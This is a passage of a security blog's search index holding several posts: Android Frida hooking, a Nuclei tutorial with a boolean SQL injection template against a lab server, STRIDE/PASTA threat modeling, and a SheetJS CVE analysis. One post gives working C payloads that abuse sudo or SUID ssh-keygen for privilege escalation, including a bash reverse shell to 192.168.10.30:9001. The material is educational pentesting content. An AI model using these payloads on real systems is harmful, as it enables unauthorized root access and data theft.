output using Frida:</p> <pre><code>// logDecryptor.js\nJava.perform(() =&gt; {\n  const AESDecryptor = Java.use(\"sg.vantagepoint.a.a\");\n  AESDecryptor[\"a\"].implementation = function (bArr, bArr2) {\n    console.log(`AESDecryptor.decrypt is called: bArr=${bArr}, bArr2=${bArr2}`);\n    const result = this[\"a\"](bArr, bArr2);\n    console.log(`AESDecryptor.decrypt result=${result}`);\n    return result;\n  };\n});\n</code></pre> <p>Convert the output byte array to a string using Python to reveal the secret phrase.</p> <p>With this setup, Android Studio enables app emulation and debugging, Burp Suite facilitates traffic interception and analysis, Frida allows dynamic application instrumentation, and Objection automates common security testing tasks. The added dynamic analysis section demonstrates the practical application of these tools in extracting secrets and bypassing protections, making this guide a comprehensive resource for mobile app security testing.</p> <p>Stay safe. Stay smart. Stay secure.</p>","tags":["Cybersecurity","Pentesting","Android","Burpsuite","VM"]},{"location":"blog/posts/16-02-2025/","title":"Introduction to Nuclei Templates","text":"","tags":["Cybersecurity","Pentesting","Nuclei","Automation","Template"]},{"location":"blog/posts/16-02-2025/#how-nuclei-templates-work","title":"How Nuclei Templates Work","text":"<p>In this article, we explore how Nuclei templates work, detailing the process of creating and configuring custom vulnerability tests. You'll learn the fundamentals, from setting up the basic information and crafting precise HTTP requests to using variables, payloads, matchers, and extractors for dynamic testing. Additionally, a practical example demonstrates how to simulate a vulnerable server and detect a vulnerability using a custom Nuclei template.</p>","tags":["Cybersecurity","Pentesting","Nuclei","Automation","Template"]},{"location":"blog/posts/16-02-2025/#what-is-a-nuclei-template","title":"What is a Nuclei Template?","text":"<p>A Nuclei template is a YAML-formatted file that, by filling in specific sections, allows you to standardize and automate vulnerability detection without having to rewrite code each time. In this article, we will work with the most common protocol for templates: HTTP.</p> <ul> <li>Basic Information: Identifier, name, author, severity, and description.</li> <li>Requests: Configuration of HTTP requests that will be sent to the target.</li> <li>Matchers: Conditions that must be met in the response to determine if the vulnerability is present.</li> <li>Extractors (Optional): Tools to extract and diplay additional information from the response.</li> </ul>","tags":["Cybersecurity","Pentesting","Nuclei","Automation","Template"]},{"location":"blog/posts/16-02-2025/#explanation-of-the-template-parts","title":"Explanation of the Template Parts","text":"","tags":["Cybersecurity","Pentesting","Nuclei","Automation","Template"]},{"location":"blog/posts/16-02-2025/#information-section-info","title":"Information Section (info)","text":"<p>This section categorizes the template using metadata fields:</p> <ul> <li>id: Unique identifier for the template.</li> <li>severity: Indicates the vulnerability\u2019s criticality (e.g., low, medium, high, critical).</li> <li>reference: URLs to supporting documentation, CVEs, or external resources.</li> <li>tags: Keywords that facilitate searching and classification.</li> </ul> <p>Example:</p> <pre><code>id: example-vulnerability-id\ninfo:\n  name: \"Generic Vulnerability Example\"\n  author: \"AuthorName\"\n  severity: \"medium\"\n  description: \"Detects a generic vulnerability in a web application.\"\n  reference:\n    - \"https://example.com/vulnerability-details\"\n  tags: [\"example\", \"web\", \"vulnerability\"]\n</code></pre>","tags":["Cybersecurity","Pentesting","Nuclei","Automation","Template"]},{"location":"blog/posts/16-02-2025/#request-definition","title":"Request Definition","text":"<p>For HTTP-based templates, this section specifies the HTTP requests to be executed:</p> <ul> <li>method: HTTP method (e.g., GET, POST, PUT, DELETE).</li> <li>path: Target endpoint(s), which may include dynamic variables (e.g., <code>{{BaseURL}}</code>).</li> <li>headers, body, timeout, retries: Additional request parameters.</li> </ul> <p>Example:</p> <pre><code>requests:\n  - method: POST\n    path:\n      - \"{{BaseURL}}/api/login\"\n    headers:\n      Content-Type: \"application/json\"\n      User-Agent: \"Mozilla/5.0 (compatible; Nuclei)\"\n    body: '{\"username\": \"admin\", \"password\": \"admin\"}'\n    timeout: 5\n    retries: 2\n</code></pre>","tags":["Cybersecurity","Pentesting","Nuclei","Automation","Template"]},{"location":"blog/posts/16-02-2025/#variables-and-placeholders","title":"Variables and Placeholders","text":"<p>Variables can be predefined or custom variables to enable dynamic configuration:</p> <ul> <li>Predefined variables: e.g., <code>{{BaseURL}}</code> automatically resolves to the target host.</li> <li>Custom variables: User-defined values that can be reused across multiple sections.</li> <li>Functions: Variables may incorporate functions (e.g., <code>base64_decode(\"QXRsYW5zZWMK\")</code>) to modify data at runtime.</li> </ul> <p>Supported protocols: dns, http, headless, and network.</p>","tags":["Cybersecurity","Pentesting","Nuclei","Automation","Template"]},{"location":"blog/posts/16-02-2025/#payloads","title":"Payloads","text":"<p>Payloads allow injection tests or brute-force methods by defining lists of values\u2014such as strings, special characters, or patterns. Each payload is iterated over and injected into designated request parameters.</p> <p>Example:</p> <pre><code>payloads:\n  usernames:\n    - admin\n    - root\n</code></pre> <pre><code>payloads:\n  usernames:\n    file: \"payloads/usernames.txt\"\n</code></pre> <p>These values are referenced in requests using placeholders (e.g., <code>{{username}}</code>).</p>","tags":["Cybersecurity","Pentesting","Nuclei","Automation","Template"]},{"location":"blog/posts/16-02-2025/#matchers","title":"Matchers","text":"<p>Matchers validate parts of the protocol response using different techniques. There are seven primary matcher types:</p> <ul> <li>status: Compares HTTP status codes.</li> <li>size: Validates content length.</li> <li>word: Searches for specific words or phrases.</li> <li>regex: Matches text using regular expressions.</li> <li>binary: Detects hexadecimal or binary sequences.</li> <li>dsl: Evaluates expressions via a domain-specific language for complex conditions (very handy and used).</li> <li>xpath: Extracts data from structured XML/HTML using XPath.</li> </ul> <p>Matchers can be combined with logical conditions (AND/OR), and negative matchers can be specified using <code>negative: true</code>.</p>","tags":["Cybersecurity","Pentesting","Nuclei","Automation","Template"]},{"location":"blog/posts/16-02-2025/#extractors","title":"Extractors","text":"<p>Extractors capture specific data from responses for further processing or reuse. They include:</p> <ul> <li>regex: Uses regular expressions to extract patterns.</li> <li>kval: Retrieves key\u2013value pairs from headers or cookies.</li> <li>json: Applies JQ-like syntax to extract data from JSON responses.</li> <li>xpath: Uses XPath to extract elements or attributes from HTML/XML.</li> <li>dsl: Evaluates expressions to compute values (e.g., body length).</li> </ul> <p>Dynamic extractors (with <code>internal: true</code>) capture runtime values\u2014such as CSRF tokens\u2014for use in subsequent requests.</p>","tags":["Cybersecurity","Pentesting","Nuclei","Automation","Template"]},{"location":"blog/posts/16-02-2025/#advanced-features","title":"Advanced Features","text":"<ul> <li>Multiple Requests: Chain several HTTP requests to simulate multi-step interactions (e.g., extract a CSRF token from a GET request for use in a subsequent POST request).</li> <li>Custom Scripts: Process extracted values inline (e.g., convert a token to lowercase before reuse).</li> <li>Attack Modes: Define payload injection strategies such as battering ram, clusterbomb, or pitchfork.</li> </ul>","tags":["Cybersecurity","Pentesting","Nuclei","Automation","Template"]},{"location":"blog/posts/16-02-2025/#practical-guide-vulnerable-web-server-and-nuclei-template","title":"Practical Guide: Vulnerable Web Server and Nuclei Template","text":"","tags":["Cybersecurity","Pentesting","Nuclei","Automation","Template"]},{"location":"blog/posts/16-02-2025/#start-the-vulnerable-docker","title":"Start the vulnerable docker","text":"<p>We are going to be using this server with a couple vulnerabilities to test and practice our new acquired knowledge about Nuclei templates.</p> <p>To run the docker: <code>docker run -p 1234:8000 -it appsecco/dsvw</code></p> <p>Once it has started, you can access it and see a couple of vulnerabilities to test and create templates for. The first one is the following example.</p> <p>In this first example there is a boolean SQLI which can be detected as the table fills or not, so because that the matcher selected to detect this vulnerability is a dsl looking at the length of the response body. </p>","tags":["Cybersecurity","Pentesting","Nuclei","Automation","Template"]},{"location":"blog/posts/16-02-2025/#create-a-nuclei-template-to-detect-the-boolean-sqli","title":"Create a Nuclei Template to Detect the Boolean SQLI","text":"<p>To find the length of the password, we will use a payload (ranging from 1 to 9) hardcoded in the template, although a file could also be used for more dynamic payloads.</p> <p>Create a file called something like <code>BSQLI-dsvw.yaml</code> with the following content:</p> <pre><code>id: boolean-sqli-password-extract\ninfo:\n  name: SQLite Boolean-Based SQL Injection - Password Extraction\n  author: yourName\n  severity: critical\n  tags: [\"sqli\",\"sqlite\",\"boolean-based\"]\n\nhttp:\n  - method: GET\n    path:\n      - \"{{BaseURL}}?id=2%20AND%20SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20name%3D%27admin%27)%2C1%2C1)%3D%27{{length}}%27\"\n\n    payloads:\n      length:\n        - 1\n        - 2\n        - 3\n        - 4\n        - 5\n        - 6\n        - 7\n        - 8\n        - 9\n    matchers-condition: and\n    matchers:\n      - type: dsl\n        dsl:\n          - \"len(body)&gt;1350 &amp;&amp; status_code==200\"\n</code></pre>","tags":["Cybersecurity","Pentesting","Nuclei","Automation","Template"]},{"location":"blog/posts/16-02-2025/#run-nuclei-with-the-template","title":"Run Nuclei with the Template","text":"<p>With the server running at <code>http://localhost:1234</code>, open another terminal and run:</p> <pre><code>nuclei -u http://localhost:8000 -t BSQLI-dsvw.yaml\n</code></pre> <p>Nuclei will send a requests to the server and upon finding correct length, will display a result indicating that the test was successful and the payload that corresponds to the length of the password.</p>","tags":["Cybersecurity","Pentesting","Nuclei","Automation","Template"]},{"location":"blog/posts/16-02-2025/#conclusion","title":"Conclusion","text":"<p>Whether you are a bug hunter, a pentester or even working from the defensive side, having Nuclei in your arsenal of tools will make your work more efficient and allow you to focus on more complex vulnerabilities to be discovered.</p> <p>This example was done using basic templates, but you can go much further. You can create your own templates tailored to your needs, contribute to the community by sharing new rules, integrate Nuclei into CI/CD flows, or use the templates to perform continuous monitoring of your infrastructure.</p> <p>Stay safe. Stay smart. Stay secure.</p>","tags":["Cybersecurity","Pentesting","Nuclei","Automation","Template"]},{"location":"blog/posts/16-03-2025/","title":"Threat Modeling: Implementing STRIDE and PASTA in the Real World","text":"","tags":["Cybersecurity","Threat Modeling","STRIDE","PASTA","Security by Design","Risk Analysis","Information Security","DevSecOps","Data Protection","Vulnerabilities"]},{"location":"blog/posts/16-03-2025/#introduction","title":"Introduction","text":"<p>In the world of cybersecurity, protecting applications and systems from their design phase is crucial. With the increasing sophistication of attacks, the Security by Design approach has become a necessity for organizations. Within this strategy, threat modeling is a fundamental technique that allows identifying vulnerabilities before they can be exploited.</p> <p>In this article, we will explore two of the most effective models for analyzing and mitigating threats in real projects: STRIDE and PASTA. We will delve into their characteristics, operation and how they can contribute to information security from a risk prevention and mitigation perspective.</p>","tags":["Cybersecurity","Threat Modeling","STRIDE","PASTA","Security by Design","Risk Analysis","Information Security","DevSecOps","Data Protection","Vulnerabilities"]},{"location":"blog/posts/16-03-2025/#what-is-threat-modeling-and-why-is-it-needed","title":"What is Threat Modeling and why is it needed?","text":"<p>Threat modeling is a process to identify possible attack vectors against a system and develop strategies to mitigate them. Its goal is to detect security flaws from the design phase, avoiding costly fixes later.</p> <p>This proactive approach allows evaluating risks from both an offensive and defensive perspective simultaneously, helping development and security teams implement measures before problems occur. Through threat modeling, organizations can identify critical assets, analyze attack vectors and apply appropriate controls, reducing the impact of potential vulnerabilities.</p>","tags":["Cybersecurity","Threat Modeling","STRIDE","PASTA","Security by Design","Risk Analysis","Information Security","DevSecOps","Data Protection","Vulnerabilities"]},{"location":"blog/posts/16-03-2025/#benefits-of-threat-modeling","title":"Benefits of Threat Modeling","text":"<p>Threat modeling not only improves an organization's security posture but also provides significant operational, legal, and economic advantages:</p> <ul> <li> <p>Risk reduction: Allows anticipating and correcting vulnerabilities before they are exploited, preventing security breaches and cyber attacks.</p> </li> <li> <p>Cost savings: Minimizes late repairs and reduces the frequency of security incidents, resulting in lower costs associated with damages and remediation.</p> </li> <li> <p>Regulatory compliance: Facilitates compliance with regulations and standards such as GDPR, ISO 27001, and NIST, ensuring systems meet security best practices.</p> </li> <li> <p>Improved software quality: Security is integrated from the initial development phase, avoiding critical issues in later stages of the software lifecycle.</p> </li> <li> <p>Easier decision making: Provides a systematic and documented approach to risk assessment, allowing organizations to allocate resources more efficiently and make informed security decisions.</p> </li> </ul>","tags":["Cybersecurity","Threat Modeling","STRIDE","PASTA","Security by Design","Risk Analysis","Information Security","DevSecOps","Data Protection","Vulnerabilities"]},{"location":"blog/posts/16-03-2025/#threat-modeling-frameworks","title":"Threat Modeling Frameworks","text":"<p>There are various frameworks that adapt to different organizational contexts and needs:</p> <ul> <li> <p>Asset-based Frameworks: Focus on identifying and protecting an organization's most valuable assets, such as sensitive data or critical systems.</p> </li> <li> <p>Attacker-based Frameworks: Analyze the motivations, capabilities, and methods of potential attackers to anticipate their movements.</p> </li> <li> <p>Software-based Frameworks: Specifically designed to detect vulnerabilities in applications during their development.</p> </li> <li> <p>Risk-based Frameworks: Evaluate threats according to their probability and potential impact on business objectives.</p> </li> </ul> <p>Among the most used frameworks in the industry are STRIDE and PASTA, each with their own unique strengths and approaches to addressing security from the early stages of development.</p>","tags":["Cybersecurity","Threat Modeling","STRIDE","PASTA","Security by Design","Risk Analysis","Information Security","DevSecOps","Data Protection","Vulnerabilities"]},{"location":"blog/posts/16-03-2025/#stride-category-based-threat-identification","title":"STRIDE: Category-Based Threat Identification","text":"<p>Developed by Microsoft, STRIDE is a model that classifies threats into six categories, allowing security teams to design specific defenses. This structured approach helps mitigate risks from the design phase of software, improving security and reducing vulnerabilities before they can be exploited.</p> <p>STRIDE provides a systematic framework to analyze each system component for specific vulnerabilities. Below, each threat category and corresponding mitigation strategies are detailed:</p> <ul> <li> <p>Spoofing: Occurs when an attacker impersonates another entity to gain unauthorized access. This can include falsification of user identities, services, or systems.</p> <ul> <li>Examples: Phishing, cookie forgery, URL spoofing.</li> <li>Mitigation: Implementation of multi-factor authentication (MFA), use of digital certificates, and robust identity management systems.</li> </ul> </li> <li> <p>Tampering: Refers to unauthorized modification of data, whether in transit or at rest.</p> <ul> <li>Examples: Database data alteration, web form parameter modification, SQL injection.</li> <li>Mitigation: Use of digital signatures, integrity control through hash functions, implementation of strict access controls and input validation.</li> </ul> </li> <li> <p>Repudiation: Occurs when a user denies having performed an action and there is no way to prove otherwise.</p> <ul> <li>Examples: A user denying having made a fraudulent transaction or sent a malicious message.</li> <li>Mitigation: Secure and signed audit logs, implementation of digital signatures for transactions, and immutable records using technologies like blockchain.</li> </ul> </li> <li> <p>Information Disclosure: Is the unauthorized exposure of sensitive information to individuals who should not have access to it.</p> <ul> <li>Examples: Personal data leaks, exposure of internal configurations, or display of detailed errors.</li> <li>Mitigation: Encryption of data in transit and at rest, implementation of the principle of least privilege, and sanitization of user-visible errors.</li> </ul> </li> <li> <p>Denial of Service: Attacks designed to make a system or application inaccessible to its legitimate users.</p> <ul> <li>Examples: HTTP request flooding, server resource exhaustion, or distributed DDoS attacks.</li> <li>Mitigation: Implementation of firewalls and DDoS mitigation systems, request rate limiting, and design of scalable and redundant architectures.</li> </ul> </li> <li> <p>Elevation of Privilege: Occurs when a user obtains access levels higher than those assigned.</p> <ul> <li>Examples: Operating system vulnerability exploitation, command injection, or buffer overflow.</li> <li>Mitigation: Application of the principle of least privilege, system segmentation, regular security updates, and rigorous input validation.</li> </ul> </li> </ul>","tags":["Cybersecurity","Threat Modeling","STRIDE","PASTA","Security by Design","Risk Analysis","Information Security","DevSecOps","Data Protection","Vulnerabilities"]},{"location":"blog/posts/16-03-2025/#practical-applications-of-stride","title":"Practical Applications of STRIDE","text":"<p>The STRIDE model is widely used in the cybersecurity industry due to its clear focus on threat classification and the ease with which it can be integrated into secure development processes. It is especially useful in:</p> <ul> <li> <p>Secure API Design: Helps identify and mitigate risks in service-to-service communication.</p> </li> <li> <p>Database Protection: Helps implement measures to prevent sensitive data manipulation and disclosure.</p> </li> <li> <p>Secure Web and Mobile Application Architectures: Facilitates the creation of more robust systems against attacks.</p> </li> </ul>","tags":["Cybersecurity","Threat Modeling","STRIDE","PASTA","Security by Design","Risk Analysis","Information Security","DevSecOps","Data Protection","Vulnerabilities"]},{"location":"blog/posts/16-03-2025/#recommended-tools-for-threat-modeling-with-stride","title":"Recommended Tools for Threat Modeling with STRIDE","text":"<p>To facilitate the implementation of the STRIDE model, specialized tools can be used that automate threat identification and mitigation strategy generation:</p> <ul> <li> <p>Microsoft Threat Modeling Tool: An official Microsoft tool designed to help developers identify and mitigate security threats in their applications.</p> </li> <li> <p>OWASP Threat Dragon: An open-source platform that enables threat modeling in software applications.</p> </li> <li> <p>Threatspec: A tool that facilitates threat modeling automation, allowing its integration into agile development and DevOps.</p> </li> </ul> <p>The use of STRIDE in combination with these tools enables more efficient vulnerability detection and better system protection from the initial phase.</p>","tags":["Cybersecurity","Threat Modeling","STRIDE","PASTA","Security by Design","Risk Analysis","Information Security","DevSecOps","Data Protection","Vulnerabilities"]},{"location":"blog/posts/16-03-2025/#pasta-a-risk-based-approach","title":"PASTA: A Risk-Based Approach","text":"<p>PASTA (Process for Attack Simulation and Threat Analysis) is a more detailed model based on risk analysis and attack simulation. Unlike STRIDE, which focuses on threat categorization, PASTA provides a holistic approach, evaluating threats based on potential business impact.</p> <p>The 7 Phases of PASTA are:</p> <ol> <li> <p>Goal Definition: Assessment of security requirements and business-specific threats.</p> </li> <li> <p>Intelligence Gathering: Environment analysis, identification of malicious actors, and collection of data on previous attacks.</p> </li> <li> <p>System Architecture Modeling: Detailed evaluation of infrastructure, software, and system dependencies.</p> </li> <li> <p>Vulnerability Analysis: Identification of weaknesses using security scanning tools and penetration testing.</p> </li> <li> <p>Attack Analysis: Simulation of potential attacks to assess how detected vulnerabilities could be exploited.</p> </li> <li> <p>Mitigation Strategy: Development of response and remediation plans based on findings.</p> </li> <li> <p>Monitoring and Continuous Improvement: Implementation of controls for early threat detection and defense updates.</p> </li> </ol>","tags":["Cybersecurity","Threat Modeling","STRIDE","PASTA","Security by Design","Risk Analysis","Information Security","DevSecOps","Data Protection","Vulnerabilities"]},{"location":"blog/posts/16-03-2025/#practical-applications-of-pasta","title":"Practical Applications of PASTA","text":"<p>PASTA is particularly useful in business environments where cybersecurity strategies need to be aligned with business and regulatory objectives. Its risk-based approach allows prioritizing efforts and resources on the most critical threats.</p> <p>Some of its most common applications include:</p> <ul> <li> <p>Critical Infrastructure Protection: Companies handling sensitive data can use PASTA to strengthen their systems against advanced threats.</p> </li> <li> <p>Regulatory Compliance: Helps comply with regulations like GDPR, ISO 27001, and NIST by providing a detailed risk-based security framework.</p> </li> <li> <p>Security in DevOps Environments: Its integration with agile methodologies allows identifying risks and applying solutions without affecting development speed.</p> </li> </ul>","tags":["Cybersecurity","Threat Modeling","STRIDE","PASTA","Security by Design","Risk Analysis","Information Security","DevSecOps","Data Protection","Vulnerabilities"]},{"location":"blog/posts/16-03-2025/#recommended-tools-for-threat-modeling-with-pasta","title":"Recommended Tools for Threat Modeling with PASTA","text":"<p>For implementing the PASTA model, tools can be used that facilitate attack simulation and vulnerability analysis:</p> <ul> <li> <p>AttackIQ: Attack simulation platform that helps validate security strategies through automation of realistic threat scenarios.</p> </li> <li> <p>Cymulate: Tool that allows testing system resilience against various attack tactics through automated attack vector simulations.</p> </li> <li> <p>Mandiant Security Validation (formerly Verodin): Helps evaluate the effectiveness of security controls in enterprise environments through continuous threat intelligence-based testing.</p> </li> <li> <p>ThreatModeler: Automated platform that facilitates threat identification, prioritization, and management throughout the development lifecycle.</p> </li> </ul> <p>The PASTA model, with its risk-based approach and attack simulations, becomes a key tool for strengthening enterprise security, enabling better preparation against advanced threats and optimization of defense strategies.</p>","tags":["Cybersecurity","Threat Modeling","STRIDE","PASTA","Security by Design","Risk Analysis","Information Security","DevSecOps","Data Protection","Vulnerabilities"]},{"location":"blog/posts/16-03-2025/#practical-implementation-considerations-for-applying-stride-and-pasta","title":"Practical Implementation: Considerations for Applying STRIDE and PASTA","text":"<p>To integrate these models into a security strategy, it is recommended to:</p> <ul> <li>Conduct periodic system analyses to identify new threats and evaluate the effectiveness of security controls.</li> <li>Define effective security controls for each threat category identified in STRIDE or PASTA.</li> <li>Train development teams in threat modeling and its impact on application security.</li> <li>Use specialized tools like Microsoft Threat Modeling Tool and OWASP Threat Dragon to structure analyses and facilitate automation.</li> <li>Continuously monitor and update implemented controls to adapt to new emerging threats and vulnerabilities.</li> <li>Integrate threat modeling into the software development lifecycle (SDLC) to ensure security is a priority at all stages.</li> </ul> <p>These approaches not only reduce risks but also foster a proactive security organizational culture, minimizing the possibility of incidents and improving resilience against cyber attacks.</p>","tags":["Cybersecurity","Threat Modeling","STRIDE","PASTA","Security by Design","Risk Analysis","Information Security","DevSecOps","Data Protection","Vulnerabilities"]},{"location":"blog/posts/16-03-2025/#conclusion-and-future-perspectives","title":"Conclusion and Future Perspectives","text":"<p>Threat modeling is a key tool in protecting systems and applications against cyber attacks. The combination of STRIDE and PASTA allows addressing threats from different perspectives, facilitating risk mitigation and implementation of more robust security strategies.</p> <p>With the constant evolution of threats in the digital world, the integration of these models along with emerging technologies, such as artificial intelligence for threat detection and real-time risk analysis, will be essential for the future of cybersecurity.</p> <p>Stay safe. Stay smart. Stay secure.</p>","tags":["Cybersecurity","Threat Modeling","STRIDE","PASTA","Security by Design","Risk Analysis","Information Security","DevSecOps","Data Protection","Vulnerabilities"]},{"location":"blog/posts/17-10-2024/","title":"Abusing ssh-keygen","text":"<p>SSH-Keygen is a tool that allows you to create and manage SSH keys, this tool is present in most UNIX systems today as a tool to facilitate the management of SSH keys.</p> <p>In this article we will explore some methods to abuse this tool with certain configurations as a method of persistence or privilege escalation on the system.</p> <p>In particular, we will abuse a specific functionality of this binary that allows the loading of public keys from a card reader library, this option is the -D parameter, its use is as follows: </p> <pre><code>ssh-keygen -D ./lib.so\n</code></pre>","tags":["Cybersecurity","Pentesting","SSH","Linux","SUID","Persistence"]},{"location":"blog/posts/17-10-2024/#how-to-generate-the-payload","title":"How to generate the payload","text":"<p>Now that we've explained how to use this function, let's look in more detail at how to generate a loadable payload, for which we'll first need to obtain a version of pkcs11.h . This header file is where we define the data types needed for the function of our library that will call ssh-keygen when using the -D parameter. </p> <p>In our case, we will go to the Open Smart Card repository and download the version we need from the following URL:</p> <p>GitHub - PKCS11</p> <p>With this file we will proceed to write a small program in C with the necessary structure to be executed by ssh-keygen, in our case this program will spawn a bash shell.</p> <pre><code>#include \"pkcs11.h\"\n#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n\nCK_RV C_GetFunctionList(CK_FUNCTION_LIST_PTR_PTR ppFunctionList) {\n\n    pid_t pid = fork();\n\n    if (pid == 0) {\n\n        char *cmd = \"/bin/bash\";\n        char *args[] = {cmd, NULL};\n        execv(cmd,args);\n\n   } else if(pid &gt; 0) {\n        wait(NULL);\n    } else {\n        perror(\"fork\");\n        return 1;\n    }\n\n    return CKR_OK;\n}\n</code></pre> <p>Once compiled we can load it as a library as indicated in the introduction. </p>","tags":["Cybersecurity","Pentesting","SSH","Linux","SUID","Persistence"]},{"location":"blog/posts/17-10-2024/#profit","title":"Profit","text":"","tags":["Cybersecurity","Pentesting","SSH","Linux","SUID","Persistence"]},{"location":"blog/posts/17-10-2024/#case-1-sudo-ssh-keygen","title":"Case 1: Sudo SSH-Keygen","text":"<p>Let's take advantage of a scenario where our user has permissions to execute the ssh-keygen command as root.</p> <pre><code>Matching Defaults entries for pnavas on test:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/snap/bin,\n    use_pty\n\nUser pnavas may run the following commands on permx:\n    (ALL : ALL) NOPASSWD: /usr/bin/ssh-keygen\n</code></pre> <p>In this case, instead of using a simple bash call, we will load a reverse shell.</p> <pre><code>#include \u2018pkcs11.h\u2019\n#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n\nCK_RV C_GetFunctionList(CK_FUNCTION_LIST_PTR_PTR ppFunctionList) {\n\n    pid_t pid = fork();\n\n    if (pid == 0) {\n\n        char *cmd = \u2018/bin/bash\u2019;\n        char *args[] = {cmd, \u2018-c\u2019 , \u2018bash -i &gt;&amp; /dev/tcp/192.168.10.30/9001 0&gt;&amp;1\u2019, NULL};\n        execv(cmd,args);\n\n   } else if(pid &gt; 0) {\n        wait(NULL);\n    } else {\n        perror(\u2018fork\u2019);\n        return 1;\n    }\n\n    return CKR_OK;\n}\n</code></pre> <p>As a result, when we load it, we will get a root connection in our listener, we could modify it to run a shell simply as in the example in the theory section </p>","tags":["Cybersecurity","Pentesting","SSH","Linux","SUID","Persistence"]},{"location":"blog/posts/17-10-2024/#case-2-ssh-keygen-suid","title":"Case 2: SSH Keygen SUID","text":"<p>In this scenario we are going to exploit a slightly less common scenario where ssh-keygen has the SUID bit set, in this case to keep the SUID privileges we need to change the library code a bit so that the shell keeps the privileges</p> <pre><code>#include \u2018pkcs11.h\u2019\n#include &lt;stdio.h&gt;\n#include &lt;unistd.h&gt;\n\nCK_RV C_GetFunctionList(CK_FUNCTION_LIST_PTR_PTR ppFunctionList) {\n\n    pid_t pid = fork();\n\n    if (pid == 0) {\n\n        char *cmd = \u2018/bin/bash\u2019;\n        char *args[] = {cmd, \u2018-p\u2019, NULL};\n        execv(cmd,args);\n\n   } else if(pid &gt; 0) {\n        wait(NULL);\n    } else {\n        perror(\u2018fork\u2019);\n        return 1;\n    }\n\n    return CKR_OK;\n}\n</code></pre> <p>Once compiled, we can run the command to load the library and get a shell with the necessary privileges.</p>","tags":["Cybersecurity","Pentesting","SSH","Linux","SUID","Persistence"]},{"location":"blog/posts/17-10-2024/#final-thoughts","title":"Final Thoughts","text":"<p>As demonstrated, ssh-keygen is a powerful tool that, when misconfigured or misused, can become a significant security risk. The scenarios presented in this article highlight the importance of properly configuring and restricting access to binaries with elevated privileges.</p> <p>By understanding and proactively managing the capabilities and risks associated with common tools like ssh-keygen, administrators can ensure the integrity and security of their systems. </p> <p>Note</p> <p>Always adopt the principle of least privilege and conduct regular security audits to minimize attack surfaces.</p> <p>Stay safe. Stay smart. Stay secure.</p>","tags":["Cybersecurity","Pentesting","SSH","Linux","SUID","Persistence"]},{"location":"blog/posts/19-01-2025/","title":"The day that Dependabot met SheetJS","text":"<p>It all started with a notification from Dependabot a few days ago. While reviewing an internal project repository, I encountered the following message:</p> Dependabot alert <p>I proceeded with the standard Dependabot workflow to address the issues, as I had assumed it was a routine update. However, I was surprised when the fixes for both vulnerabilities failed because the required patched version could not be found.</p> Dependabot alert for DoS in SheetJS Dependabot alert for Prototype Pollution on SheetJS <p>After some investigation, I discovered an ongoing conflict between npm and the developers of xlsx, due to an issue with the Multi-Factor Authentication (MFA) token from a few years ago. As a result, xlsx has dropped out of the npm ecosystem and is now publishing its packages through other Content Delivery Networks (CDNs) for the distribution of its packages. This has introduced a new level of complexity, making it more challenging for users of npm to update packages and address vulnerabilities effectively.</p> <p>Since our application was affected by these vulnerabilities, I decided to dig deeper into them to assess the risk of delaying the patch and to explore possible workarounds if necessary, and it was also a good excuse to write an article for the blog, an article that can surely help more than one developer to decide how to deal with the same situation in SheetJS or xlsx. With that in mind, let us analyse the two vulnerabilities reported by the dependanbot in more detail:</p>","tags":["Cybersecurity","Dependency Management","Vulnerability Management","Development","NodeJS","Patching","Code Review"]},{"location":"blog/posts/19-01-2025/#prototype-pollution-in-sheetjs-aka-cve-2023-30533","title":"Prototype Pollution in SheetJS aka CVE-2023-30533","text":"<p>This vulnerability in SheetJS allows an attacker to upload a specially crafted file that would corrupt existing object prototypes in the application. Prototype pollution could potentially lead to serious problems such as Remote Code Execution (RCE), Cross-Site Scripting (XSS) or Denial of Service (DoS). Depending on the context, this is a significant threat.</p> <p>Digging around, I found an article written by a researcher at Solid Labs who discovered the vulnerability. Although the article is in Russian and partially behind a paywall, it gives some insight into the context and impact of the vulnerability. On the one hand the risk seems to be limited, on the other hand it confirms that XSS can be achieved with this vulnerability, although the proof of concept for the XSS is behind the paywall.</p> <p>Using the freely available part of the article, I was able to create a basic PoC for prototype pollution with limited impact. This allowed us to test if our application was vulnerable and implement a targeted patch to sanitise the attack vector while preparing for a full version update. Also using the PoC and reviewing the commit that patched the vulnerability, I found that the vulnerability occurred when importing a sheet with comments. The root cause seems to be that the developers didn't anticipate that cell references could be manipulated by an attacker. Their final solution was to validate that the cell references were legitimate.</p> <p>Knowing this, we can create a local patch for our library version, but having worked as a pentester for several years, I was curious about how to scale this prototype pollution to XSS. Reviewing the patch was the key to finding the XSS vector:</p> Commit that fix the XSS <p>We can see that the developers added escapehtml to a line in the same commit that fixes the vulnerability. Tracing the code backwards, we can see that the corrected line was only executed when the library was used to parse the XLS to HTML using the make_html_row function. In our case, as we don't use HTML parsing in our application, this vulnerability is not critical as we don't use the vulnerable function. However, we have applied the two patches locally to improve security while we prepare for the full update.</p> <p>Knowing this, developing an exploit to generate a malicious XLSX with an XSS payload is fairly straightforward. However, in order not to make it easier to exploit by publishing a proof of concept for a difficult to mitigate vulnerability, I will not publish a working proof of concept for exploiting this XSS in a package that gets about 2.5 million downloads per week.</p>","tags":["Cybersecurity","Dependency Management","Vulnerability Management","Development","NodeJS","Patching","Code Review"]},{"location":"blog/posts/19-01-2025/#sheetjs-regular-expression-denial-of-service-redos-cve-2024-22363","title":"SheetJS Regular Expression Denial of Service (ReDoS) (CVE-2024-22363)","text":"<p>This vulnerability allows an attacker to upload a file that causes a significant delay in the application by exploiting regex flaws in SheetJS. Although not critical to our application, I was interested in replicating the problem and creating a temporary virtual patch until the update was ready.</p> <p>The first step was to examine the commit in the SheetJS repository. The code revealed several greedy regex patterns, in particular the reported one is in the parsing of comments &lt;!--). The researcher provided a PoC demonstrating how to exploit this vulnerability.</p> <p>We can verify the vulnerability in the following way:</p> <p> Proof of Concept for ReDoS <p>While the PoC shows a delay of 42 seconds, the workload grows exponentially with larger files. A file ten times its original size would take 4,980 seconds to process - 100 times the delay for only a tenfold increase in content.</p> <p>In our case, testing the PoC on our development environment showed no noticeable delay, as our application validates that the file is a real XLS file before parsing. This validation mitigates the exploitability of the vulnerability in our setup. However, it's still necessary to address the issue as there are more greedy regex in the library.</p> <p>Two potential solutions were identified:</p> <ul> <li>Detect exploitation signs before parsing the XLS.</li> 